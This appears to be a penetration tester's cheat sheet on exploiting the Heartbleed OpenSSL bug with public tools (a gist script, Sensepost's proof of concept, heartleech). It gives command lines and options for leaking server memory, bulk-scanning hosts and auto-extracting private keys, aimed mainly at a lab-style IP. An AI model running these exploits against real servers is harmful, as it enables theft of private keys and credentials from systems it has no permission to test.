## Heartbleed

### Defribulator

https://gist.github.com/eelsivart/10174134

This is my favorite exploit script, as it shows the output with line breaks instead of in hex format.

```bash
python heartbleed.py 10.10.10.79

# Options
-p PORT
-n NUM	# Number of times to connect
-s	# Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc
-v	# Verbose
-x	# Enable hex output
-r	# Raw outfile
-a 	# ASCII outfile
-e	# Attempt to extract private key (requires gmpy module)
```

You can install gmpy for Python 1/2 with `sudo pip install gmpy`

### Sensepost Script

This script tests and exploits the vulnerability, allowing you to specify the number of times you want it to run

Generate some data in memory by loading a page of interest that will get the data you want into memory, then download and run the code found here:  https://github.com/sensepost/heartbleed-poc

```bash
python heartbleed-poc.py 10.10.10.79
```

I was able to use this to get the passphrase for a private key.

### Heartleech

NOTE:  I got different results with this program than the POC code above.  This program is good to get the private key of a webserver but that's about all I was able to do with it so far.

This program exploits the heartbleed vulnerability.  Install with apt, but this is the source page:  https://github.com/robertdavidgraham/heartleech

This tools supports HTTPS, SMTP, etc

```bash
heartleech 10.10.10.79 -fOUTFILE

# Options
-p	443	# Specify port, defaults to 443
--threads 100	# Specify the number of scan threads
-fOUTFILE  # Output file
--dump OUTFILE.bin # Output file
--ipv4 / --ipv6	# Force the IP version, defaults to IPv4
--proxy <hostname:port>	# SOCKS5N proxy support
```

#### Scanning

```bash
heartleech --scan www.site1.com www.site2.com www.site3.com site4.com

# Tests each target in a list
--scan host1 host2 ... # Scans through a list of hosts
--scanlist FILE	# Scans through targets listed in a file
	## File listing formats
    ## host:port
    ## 10.0.0.0-10.0.0.255 # IP Range
```

#### Private Certs

##### Manual

1. Get the public cert from the site:

   ```bash
   openssl s_client -showcerts -connect www.example.com:443 </dev/null
   
   # Options
   -servername www.example.com # Use this if multiple SSL hosts are served on the same IP
   ```

2. Use it to search an offline file for a private cert given a public cert

   ```bash
   heartleech --cert cloudflare.pem --read challenge.bin
   ```

##### Autopwn

Autopwn will search the output on the fly and grab the private key:

```bash
heartleech 10.10.10.79 --autopwn --threads 20
```

#### Diagnostics Mode:

```bash
heartleech --scan smtp.gmail.com:25 --proxy 10.20.30.156:9150 -d

# Options
-d	# Diagnostic switch
```
